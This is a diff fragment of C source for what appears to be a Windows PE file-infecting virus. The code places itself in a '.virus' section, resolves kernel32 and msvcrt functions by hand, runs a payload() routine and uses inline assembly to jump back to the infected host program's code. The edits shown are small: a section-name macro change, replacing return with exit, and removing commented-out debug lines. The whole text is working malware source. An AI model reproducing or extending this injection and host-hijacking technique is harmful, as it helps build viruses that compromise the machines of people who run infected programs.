@@ -8,7 +8,7 @@
 // #define KERNEL32_DLL 3
 // #define CURRENT_EXE 1
 
-#define SET_SECT __attribute__((section(".inject")))
+#define SET_SECT __attribute__((section(V_SECT_NAME)))
 
 #define V_SECT_NAME ".virus"
 
@@ -40,15 +40,17 @@ size_t length(const char* str) SET_SECT;
 int wcompare(const wchar_t *a, const wchar_t *b) SET_SECT;
 int match_suffix(char *str, char* suffix) SET_SECT;
 
+// int checker(void) SET_SECT;
+
 #define FUNCTION(name) ((t_##name)pGetProcAddress(msvcrt_hModule, s_##name))
 #define K32_FUNCTION(name) ((t##name)get_kernel_32_func(s##name, i_ex_dir, image_base))
 #define LOAD(name) t##name p##name = (t##name)get_kernel_32_func(s##name, i_ex_dir, image_base)
 
 int main()
 {
-    // asm ("jmp payload_enter");
     payload();
-    return 0;
+    exit(0);
+    // return 0;
 }
 
 void payload(void)
@@ -149,14 +151,11 @@ const char empty_str[] = "";
     // FUNCTION(printf)(format, offset);
 
     pFreeLibrary(msvcrt_hModule);
-// done
-// char s[] = "XX";
-// FUNCTION(puts)(s);
+
 // go back to host code
-// FUNCTION(puts)(empty_str);
     asm volatile (
         // "xor %%rax, %%rax\n\t"
-        "key_label: \n\t"
+        "key_label: \n\t" // 1550
         "mov $0x00001562, %%rax\n\t" // ret
         // "mov $0x000957C8, %%rax\n\t" // PE-bear
         // "mov $0x000014E0, %%rax\n\t"
